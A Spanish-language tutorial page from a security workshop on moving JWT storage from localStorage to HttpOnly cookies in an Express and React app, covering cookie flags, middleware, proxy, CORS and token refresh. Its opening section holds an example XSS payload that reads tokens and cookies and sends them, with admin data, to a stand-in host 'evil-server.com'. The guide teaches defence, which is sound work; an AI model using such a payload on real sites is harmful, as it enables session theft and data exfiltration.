---
sidebar_position: 8
title: "Autenticación Segura con Cookies"
---

# Autenticación Segura con Cookies

## El problema con localStorage

El proyecto **Taller-Testing-Security** actualmente almacena el token JWT en localStorage:

```typescript
// ui/src/utils/auth.ts (implementación actual)
export function setToken(token: string): void {
  localStorage.setItem('token', token);
}

export function getToken(): string | null {
  return localStorage.getItem('token');
}
```

Aunque localStorage es conveniente, tiene un problema de seguridad crítico: **es accesible desde cualquier JavaScript que se ejecute en la página**.

```javascript
// Si un atacante logra XSS (inyectar JavaScript malicioso):
const stolenToken = localStorage.getItem('token');

// Enviar al servidor del atacante
fetch('https://evil-server.com/steal', {
  method: 'POST',
  body: JSON.stringify({ 
    token: stolenToken,
    url: window.location.href,
    cookies: document.cookie
  })
});

// O usarlo directamente para hacer requests
fetch('https://tu-api.com/v1/admin/users', {
  headers: { 'Authorization': `Bearer ${stolenToken}` }
}).then(r => r.json()).then(data => {
  // Enviar datos confidenciales al atacante
  fetch('https://evil-server.com/data', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
```

---

## La solución: Cookies HttpOnly

Una cookie con el flag `HttpOnly` **no es accesible desde JavaScript**. Solo el navegador puede leerla y enviarla automáticamente con cada petición al servidor.

```text
┌─────────────────────────────────────────────────────────────────────┐
│               localStorage vs Cookie HttpOnly                       │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  localStorage:                                                      │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │  token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."            │   │
│  └─────────────────────────────────────────────────────────────┘   │
│           │                                                         │
│           ▼                                                         │
│  JavaScript: localStorage.getItem('token')  ← ACCESIBLE            │
│  Script XSS: localStorage.getItem('token')  ← TAMBIÉN ACCESIBLE    │
│                                                                     │
│  ─────────────────────────────────────────────────────────────────  │
│                                                                     │
│  Cookie HttpOnly:                                                   │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │  Set-Cookie: token=eyJhbG...; HttpOnly; Secure; SameSite    │   │
│  └─────────────────────────────────────────────────────────────┘   │
│           │                                                         │
│           ▼                                                         │
│  JavaScript: document.cookie → "" (token NO visible)                │
│  Script XSS: document.cookie → "" (token NO accesible)              │
│                                                                     │
│  Navegador: Envía automáticamente con cada request al dominio       │
│             sin exponer el valor a JavaScript                       │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### Flags de seguridad de cookies

| Flag | Propósito | Configuración recomendada |
|------|-----------|---------------------------|
| `HttpOnly` | No accesible por JavaScript | Siempre `true` para tokens |
| `Secure` | Solo enviar por HTTPS | `true` en producción |
| `SameSite` | Control de envío cross-origin | `strict` o `lax` |
| `Path` | Rutas donde aplica la cookie | `/` normalmente |
| `Domain` | Dominio(s) donde aplica | Solo si necesitas subdominios |
| `Max-Age/Expires` | Tiempo de vida | Igual o menor que el JWT |

---

## Implementación paso a paso

### Paso 1: Modificar el login en el backend

El backend debe enviar el token como cookie en lugar del body:

```typescript
// api/src/components/Auth/index.ts

import { Request, Response, NextFunction } from 'express';
import jwt from 'jsonwebtoken';
import * as AuthService from './service';
import app from '../../config/server/server';

export async function login(
  req: Request,
  res: Response,
  next: NextFunction
): Promise<void> {
  try {
    // 1. Validar credenciales
    const { email, password } = req.body;
    const user = await AuthService.authenticate(email, password);

    // 2. Generar token JWT
    const token = jwt.sign(
      {
        id: user._id,
        email: user.email,
        // NO incluir datos sensibles en el payload
      },
      app.get('secret'),
      {
        expiresIn: '1h',
        algorithm: 'HS256',
      }
    );

    // 3. Configurar cookie segura
    const cookieOptions = {
      // Expiración: misma que el JWT (1 hora)
      maxAge: 60 * 60 * 1000, // 1 hora en milisegundos

      // HttpOnly: NO accesible por JavaScript
      httpOnly: true,

      // Secure: Solo enviar por HTTPS
      // En desarrollo (HTTP), ponemos false
      secure: process.env.NODE_ENV === 'production',

      // SameSite: Previene CSRF
      // 'strict': Nunca enviar en requests cross-origin
      // 'lax': Enviar en navegación top-level pero no en forms POST cross-origin
      sameSite: 'strict' as const,

      // Path: Cookie válida para todas las rutas
      path: '/',
    };

    // 4. Enviar token como cookie
    res.cookie('token', token, cookieOptions);

    // 5. Responder SIN incluir el token en el body
    res.status(200).json({
      message: 'Login successful',
      user: {
        id: user._id,
        email: user.email,
      },
    });
  } catch (error) {
    next(error);
  }
}
```

### Paso 2: Implementar logout

Con cookies HttpOnly, el cliente no puede eliminar la cookie directamente. Necesitamos un endpoint:

```typescript
// api/src/components/Auth/index.ts

export async function logout(
  req: Request,
  res: Response
): Promise<void> {
  // Sobrescribir la cookie con valor vacío y expiración inmediata
  res.cookie('token', '', {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    path: '/',
    expires: new Date(0), // Fecha en el pasado = cookie expirada
  });

  res.status(200).json({
    message: 'Logged out successfully',
  });
}
```

Añadir la ruta:

```typescript
// api/src/routes/AuthRouter.ts

import { Router } from 'express';
import * as AuthComponent from '../components/Auth';
import * as jwtConfig from '../config/middleware/jwtAuth';

const router = Router();

router.post('/login', AuthComponent.login);
router.post('/register', AuthComponent.signup);

// Nueva ruta de logout (requiere estar autenticado)
router.post('/logout', jwtConfig.isAuthenticated, AuthComponent.logout);

export default router;
```

### Paso 3: Modificar el middleware de autenticación

Ahora leemos el token de la cookie en lugar del header:

```typescript
// api/src/config/middleware/jwtAuth.ts

import { Request, Response, NextFunction } from 'express';
import jwt from 'jsonwebtoken';
import app from '../server/server';
import HttpError from '../error';

export interface RequestWithUser extends Request {
  user?: {
    id: string;
    email: string;
  };
}

export function isAuthenticated(
  req: RequestWithUser,
  res: Response,
  next: NextFunction
): void {
  let token: string | undefined;

  // PRIORIDAD 1: Leer de cookie (para web app)
  if (req.cookies?.token) {
    token = req.cookies.token;
  }
  // PRIORIDAD 2: Fallback a header Authorization (para móvil, APIs externas)
  else if (req.headers.authorization?.startsWith('Bearer ')) {
    token = req.headers.authorization.substring(7);
  }

  // Sin token: no autenticado
  if (!token) {
    return next(new HttpError(401, 'Authentication required'));
  }

  try {
    // Verificar y decodificar el token
    const decoded = jwt.verify(token, app.get('secret')) as {
      id: string;
      email: string;
      iat: number;
      exp: number;
    };

    // Añadir información del usuario al request
    req.user = {
      id: decoded.id,
      email: decoded.email,
    };

    next();
  } catch (error) {
    // Manejar diferentes errores de JWT
    if (error instanceof jwt.TokenExpiredError) {
      // Limpiar cookie expirada
      res.cookie('token', '', { 
        httpOnly: true, 
        expires: new Date(0) 
      });
      return next(new HttpError(401, 'Session expired. Please login again.'));
    }

    if (error instanceof jwt.JsonWebTokenError) {
      return next(new HttpError(401, 'Invalid token'));
    }

    return next(new HttpError(401, 'Authentication failed'));
  }
}
```

### Paso 4: Configurar cookie-parser

Asegúrate de que el middleware `cookie-parser` está configurado:

```typescript
// api/src/config/middleware/middleware.ts

import cookieParser from 'cookie-parser';

export function configure(app: express.Application): void {
  // Parser para JSON
  app.use(express.json());
  
  // ✅ Parser para cookies - NECESARIO para leer cookies
  app.use(cookieParser());
  
  // ... resto de middlewares
}
```

### Paso 5: Configurar proxy en desarrollo

Las cookies solo se envían al mismo dominio (o con CORS configurado correctamente). En desarrollo, frontend (puerto 3000) y backend (puerto 4000) están en diferentes puertos, que se consideran diferentes orígenes.

La solución más simple es usar el proxy de Vite:

```typescript
// ui/vite.config.ts

import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';

export default defineConfig({
  plugins: [react()],

  server: {
    port: 3000,

    // Proxy todas las requests /api y /auth al backend
    proxy: {
      '/auth': {
        target: 'http://localhost:4000',
        changeOrigin: true,
      },
      '/v1': {
        target: 'http://localhost:4000',
        changeOrigin: true,
      },
    },
  },
});
```

Con esta configuración:
- El frontend corre en `http://localhost:3000`
- Requests a `/auth/*` y `/v1/*` se redirigen a `http://localhost:4000`
- Para el navegador, todo viene del mismo origen (localhost:3000)
- Las cookies funcionan sin problemas

### Paso 6: Actualizar el cliente HTTP

El frontend debe incluir `credentials: 'include'` en todas las peticiones para que se envíen las cookies:

```typescript
// ui/src/api/http-client.ts

class HttpClient {
  private baseUrl: string;

  constructor(baseUrl: string = '') {
    this.baseUrl = baseUrl;
  }

  async login(email: string, password: string): Promise<LoginResponse> {
    const response = await fetch(`${this.baseUrl}/auth/login`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      // ✅ CRÍTICO: Incluir cookies
      credentials: 'include',
      body: JSON.stringify({ email, password }),
    });

    if (!response.ok) {
      const error = await response.json();
      throw new Error(error.message || 'Login failed');
    }

    return response.json();
  }

  async logout(): Promise<void> {
    const response = await fetch(`${this.baseUrl}/auth/logout`, {
      method: 'POST',
      credentials: 'include',
    });

    if (!response.ok) {
      throw new Error('Logout failed');
    }
  }

  async getProjects(): Promise<Project[]> {
    const response = await fetch(`${this.baseUrl}/v1/projects`, {
      // ✅ TODAS las peticiones autenticadas necesitan credentials
      credentials: 'include',
    });

    if (!response.ok) {
      throw new Error('Failed to fetch projects');
    }

    return response.json();
  }

  async createProject(data: CreateProjectDTO): Promise<Project> {
    const response = await fetch(`${this.baseUrl}/v1/projects`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      credentials: 'include',
      body: JSON.stringify(data),
    });

    if (!response.ok) {
      throw new Error('Failed to create project');
    }

    return response.json();
  }

  async deleteProject(id: string): Promise<void> {
    const response = await fetch(`${this.baseUrl}/v1/projects/${id}`, {
      method: 'DELETE',
      credentials: 'include',
    });

    if (!response.ok) {
      throw new Error('Failed to delete project');
    }
  }
}

export const httpClient = new HttpClient();
```

### Paso 7: Simplificar el estado de autenticación

Con cookies HttpOnly, ya no necesitamos gestionar tokens manualmente:

```typescript
// ui/src/hooks/useAuth.ts

import { useState, useCallback, useEffect } from 'react';
import { httpClient } from '../api/http-client';

interface User {
  id: string;
  email: string;
}

export function useAuth() {
  const [user, setUser] = useState<User | null>(null);
  const [loading, setLoading] = useState(true);

  // Verificar si hay sesión activa al cargar
  const checkAuth = useCallback(async () => {
    try {
      // Intentar obtener el perfil
      // Si la cookie es válida, funcionará
      const profile = await httpClient.getProfile();
      setUser(profile);
    } catch {
      // No hay sesión válida o expiró
      setUser(null);
    } finally {
      setLoading(false);
    }
  }, []);

  // Verificar auth al montar el componente
  useEffect(() => {
    checkAuth();
  }, [checkAuth]);

  const login = useCallback(async (email: string, password: string) => {
    setLoading(true);
    try {
      // La cookie se guarda automáticamente por el navegador
      const response = await httpClient.login(email, password);
      setUser(response.user);
    } finally {
      setLoading(false);
    }
  }, []);

  const logout = useCallback(async () => {
    try {
      await httpClient.logout();
    } finally {
      setUser(null);
    }
  }, []);

  return {
    user,
    loading,
    isAuthenticated: !!user,
    login,
    logout,
    checkAuth,
  };
}
```

---

## Verificar la implementación

### 1. Verificar que la cookie se envía en login

```bash
# Login y guardar respuesta completa
curl -X POST http://localhost:4000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"password123"}' \
  -c cookies.txt \
  -v

# Buscar en la respuesta:
# < Set-Cookie: token=eyJhbG...; Path=/; Expires=...; HttpOnly; Secure; SameSite=Strict
```

### 2. Verificar que la cookie se envía automáticamente

```bash
# Usar las cookies guardadas en una petición autenticada
curl -X GET http://localhost:4000/v1/aboutme \
  -b cookies.txt

# Debería retornar el perfil del usuario
```

### 3. Verificar HttpOnly en el navegador

1. Abre DevTools (F12)
2. Ve a Application → Cookies → tu dominio
3. Busca la cookie `token`
4. Verifica que la columna "HttpOnly" tenga un ✓

Intenta acceder desde la consola:
```javascript
document.cookie
// No debería mostrar la cookie 'token'
```

### 4. Test de seguridad XSS

Con la implementación correcta, incluso si hay XSS, el token está protegido:

```javascript
// Simulando XSS - esto ya no funciona
console.log(localStorage.getItem('token'));  // null (ya no usamos localStorage)
console.log(document.cookie);                 // No incluye el token HttpOnly
```

---

## Configuración CORS (alternativa al proxy)

Si prefieres no usar proxy y configurar CORS correctamente:

```typescript
// api/src/config/middleware/middleware.ts

import cors from 'cors';

app.use(cors({
  // Orígenes permitidos
  origin: [
    'http://localhost:3000',
    'https://tu-app.com',
  ],
  
  // ✅ Permitir envío de cookies
  credentials: true,
  
  // Headers permitidos
  allowedHeaders: ['Content-Type', 'Authorization'],
  
  // Methods permitidos
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
}));
```

Y en el frontend:

```typescript
// Importante: Con CORS, el origin debe coincidir exactamente
const response = await fetch('http://localhost:4000/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include',  // ← Necesario para CORS con cookies
  body: JSON.stringify({ email, password }),
});
```

**Nota importante sobre CORS y cookies:**
- `credentials: 'include'` es necesario en el cliente
- El servidor debe responder con `Access-Control-Allow-Credentials: true`
- El servidor NO puede usar `Access-Control-Allow-Origin: *` con credentials
- Debe especificar el origen exacto

---

## Renovación de tokens (opcional)

Con cookies de sesión, puedes implementar renovación automática:

```typescript
// api/src/routes/AuthRouter.ts

router.post('/refresh', jwtConfig.isAuthenticated, async (req, res) => {
  // El usuario ya está autenticado (verificado por middleware)
  // Generar nuevo token
  const newToken = jwt.sign(
    { id: req.user.id, email: req.user.email },
    app.get('secret'),
    { expiresIn: '1h' }
  );

  res.cookie('token', newToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 60 * 60 * 1000,
    path: '/',
  });

  res.json({ message: 'Token refreshed' });
});
```

Y en el frontend, renovar periódicamente:

```typescript
// Renovar token cada 45 minutos (antes de que expire en 1h)
useEffect(() => {
  if (!isAuthenticated) return;

  const interval = setInterval(async () => {
    try {
      await httpClient.refreshToken();
    } catch {
      // Token expirado o inválido
      logout();
    }
  }, 45 * 60 * 1000);

  return () => clearInterval(interval);
}, [isAuthenticated]);
```

---

## Checklist de Cookies Seguras

```text
□ Cookie con flag HttpOnly activado
□ Cookie con flag Secure en producción
□ Cookie con SameSite=strict o SameSite=lax
□ cookie-parser middleware configurado
□ Todas las peticiones usan credentials: 'include'
□ Proxy configurado en desarrollo (o CORS correcto)
□ Endpoint de logout que invalida la cookie
□ Middleware lee token de cookie (con fallback a header)
□ No se guarda nada en localStorage
□ Expiración de cookie igual o menor que JWT
□ Renovación de token implementada (opcional)
```

---

## Próximo Paso

Con la autenticación securizada, el siguiente paso es asegurar que todos los datos que recibimos son válidos y seguros. Continúa con **[Validación con Mongoose](./validation-mongoose)**.
